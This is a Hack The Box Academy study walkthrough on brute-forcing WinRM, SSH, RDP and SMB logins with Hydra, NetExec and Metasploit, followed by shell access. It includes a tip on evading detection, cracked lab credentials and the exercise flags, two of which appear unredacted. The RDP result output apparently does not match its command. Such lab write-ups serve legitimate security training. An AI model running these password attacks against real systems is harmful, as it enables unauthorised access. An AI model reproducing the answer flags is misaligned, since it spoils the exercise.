### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Network Services <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Network Services Overview



Common pen-test targets: FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP. All accept username/password (some also key-based) — defaults & weak creds are common.

| Protocol | Port | Brute tool | Post-auth tool | Client |
|---|---|---|---|---|
| WinRM | 5985/5986 | NetExec, Hydra | Evil-WinRM | — |
| SSH | 22 | Hydra, NetExec | — | ssh |
| RDP | 3389 | Hydra, NetExec | — | xfreerdp, remmina |
| SMB | 445 | Hydra, NetExec, Metasploit | NetExec | smbclient |

---

#### WinRM — NetExec

Install + brute-force:

```diff
+ $ sudo apt-get -y install netexec
+ $ netexec winrm <target-IP> -u user.list -p password.list
```

<br>

`(Pwn3d!)` in output = creds also yield admin shell access.

Get an interactive PS shell with Evil-WinRM:

```diff
+ $ sudo gem install evil-winrm
+ $ evil-winrm -i <target-IP> -u <username> -p <password>
```

<br>

#### SSH

```diff
+ $ hydra -L user.list -P password.list ssh://<target-IP>
+ $ ssh user@<target-IP>
```

<br>

#### RDP

```diff
+ $ hydra -L user.list -P password.list rdp://<target-IP>
+ $ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

<br>

#### SMB

Hydra:

```diff
+ $ hydra -L user.list -P password.list smb://<target-IP>
```

<br>

NetExec — list shares:

```diff
+ $ netexec smb <target-IP> -u "user" -p "password" --shares
```

<br>

Metasploit module:

```diff
+ msf > use auxiliary/scanner/smb/smb_login
+ msf > set user_file user.list
+ msf > set pass_file password.list
+ msf > set rhosts <target-IP>
+ msf > run
```

<br>

Manual share access:

```diff
+ $ smbclient -U user \\\\<target-IP>\\SHARENAME
```

<br>

Tip: throttle via `-t 1` / `-t 4` against sensitive services to avoid lockout / detection.

<br>

---

<br>

### Exercise

IP: 10.129.202.136

---

### Question 1:
Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

Download the wordlists:

```diff
+ $ wget https://academy.hackthebox.com/storage/modules/147/network-services.zip
+ $ unzip network-services.zip
```

<br>

NetExec dictionary attack against WinRM:

```diff
+ $ netexec winrm 10.129.202.136 -u username.list -p password.list
```

	WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)

<br>

Pop a shell:

```diff
+ $ evil-winrm -i 10.129.202.136 -u john -p november
```

<br>

Recursive search for `flag.txt`:

```diff
+ *Evil-WinRM* PS C:\Users> Get-ChildItem -Path . -Filter "flag.txt" -Recurse
+ *Evil-WinRM* PS C:\Users\john\Desktop> type flag.txt
```

	HTB{That5Novemb3r}

&#x1F6A9; found **HTB{That5Nov--edit--emb3r}**.

---

### Question 2:
Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```diff
+ $ hydra -L username.list -P password.list ssh://10.129.202.136
```

	[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar

<br>

```diff
+ $ ssh dennis@10.129.202.136
+ dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt
```

	HTB{Let5R0ck1t}

&#x1F6A9; found **HTB{Let5R--edit--0ck1t}**.

---

### Question 3:
Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```diff
+ $ hydra -L username.list -P password.list rdp://10.129.202.136
```

	[+] 10.129.202.136:445 - Success: '.\chris:789456123'

<br>

```diff
+ $ xfreerdp /v:10.129.202.136 /u:chris /p:789456123
```

#### Flag is on chris's desktop.

&#x1F6A9; found **HTB{R3m0t3DeskIs--edit--w4yT00easy}**.

---

### Question 4:
Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```diff
+ $ msfconsole
+ msf > use auxiliary/scanner/smb/smb_login
+ msf > set rhost 10.129.202.136
+ msf > set user_file username.list
+ msf > set pass_file password.list
+ msf > exploit
```

	[+] 10.129.202.136:445 - Success: '.\cassie:12345678910'

<br>

```diff
+ $ smbclient ////10.129.202.136//cassie -U cassie
```

#### Browse to Desktop and read the flag.

&#x1F6A9; found **HTB{S4ndM--edit--4ndB33}**.
